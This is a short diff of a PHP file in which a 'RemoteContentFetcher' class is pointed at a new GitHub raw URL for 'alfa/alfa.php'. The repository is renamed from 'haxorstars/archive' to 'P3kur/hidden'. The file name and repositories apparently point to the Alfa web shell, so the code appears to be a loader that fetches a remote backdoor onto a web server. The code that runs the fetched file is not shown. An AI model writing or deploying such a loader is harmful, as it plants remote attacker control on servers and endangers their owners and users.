@@ -89,7 +89,7 @@ class RemoteContentFetcher {
 }
 
 try {
-    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa.php');
+    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/P3kur/hidden/main/alfa/alfa.php');
     $fetcher->setOptions([
         'timeout' => 60,
         'ssl_verify' => true
